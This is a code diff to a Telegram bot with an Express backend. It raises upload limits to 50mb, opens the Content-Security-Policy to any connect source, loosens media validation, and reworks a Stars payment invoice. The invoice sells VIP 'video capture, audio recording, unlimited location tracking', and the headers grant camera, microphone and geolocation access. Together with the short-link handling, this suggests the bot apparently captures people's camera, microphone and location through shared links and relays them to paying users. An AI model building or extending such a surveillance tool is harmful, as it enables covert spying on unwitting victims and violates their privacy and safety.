@@ -1,3 +1,4 @@
+require('dotenv').config();
 const { Telegraf, Markup } = require('telegraf');
 const express = require('express');
 const crypto = require('crypto');
@@ -10,8 +11,8 @@ const bot = new Telegraf(config.BOT_TOKEN);
 const app = express();
 
 // Middleware to parse JSON and URL-encoded data
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 // Security Headers
 app.use((req, res, next) => {
@@ -20,7 +21,7 @@ app.use((req, res, next) => {
     res.setHeader("X-XSS-Protection", "1; mode=block");
     res.setHeader("Referrer-Policy", "no-referrer");
     res.setHeader("Permissions-Policy", "camera=*, microphone=*, geolocation=*");
-    res.setHeader("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:;");
+    res.setHeader("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src 'self' *; media-src 'self' blob: data:;");
     next();
 });
 
@@ -212,13 +213,14 @@ function getShortLinkData(code) {
 }
 
 function validateMediaData(media_data, maxSizeMb = 15) {
-    // Basic validation: check if it's a base64 string and within size limits
-    const base64Regex = /^data:(image|video|audio)\/[a-zA-Z0-9]+;base64,([A-Za-z0-9+/=]+)$/;
+    // Basic validation: check if it's a base64 data URL and within size limits
+    const base64Regex = /^data:(image|video|audio)\/[a-zA-Z0-9.+\-;=,\s]+;base64,/;
     const match = media_data.match(base64Regex);
     if (!match) return false;
 
-    const base64Content = match[2];
-    const sizeInBytes = Buffer.byteLength(base64Content, 'base64');
+    const base64Start = media_data.indexOf(';base64,') + 8;
+    const base64Content = media_data.substring(base64Start);
+    const sizeInBytes = Math.ceil(base64Content.length * 3 / 4);
     const maxBytes = maxSizeMb * 1024 * 1024;
 
     if (sizeInBytes > maxBytes) return false;
@@ -1149,15 +1151,20 @@ bot.on('callback_query', async (ctx) => {
 
         case 'buy_vip_stars':
             ctx.answerCbQuery();
-            const starsPrice = settings.vip_price_stars;
-            await ctx.replyWithInvoice(
-                'VIP Subscription ⭐',
-                'Get VIP features: video capture, audio recording, unlimited location tracking, and no cooldown!',
-                'vip_stars_' + userId + '_' + Date.now(),
-                '',
-                'XTR',
-                [{ label: 'VIP Subscription', amount: starsPrice }]
-            );
+            try {
+                const starsPrice = settings.vip_price_stars;
+                await ctx.telegram.sendInvoice(ctx.chat.id, {
+                    title: 'VIP Subscription ⭐',
+                    description: 'Get VIP features: video capture, audio recording, unlimited location tracking, and no cooldown!',
+                    payload: 'vip_stars_' + userId + '_' + Date.now(),
+                    provider_token: '',
+                    currency: 'XTR',
+                    prices: [{ label: 'VIP Subscription', amount: starsPrice }]
+                });
+            } catch (e) {
+                writeLog(`Invoice error for user ${userId}: ${e.message}`);
+                ctx.reply('❌ حدث خطأ في إنشاء الفاتورة. حاول مرة أخرى.');
+            }
             break;
 
         case 'buy_vip_referrals':
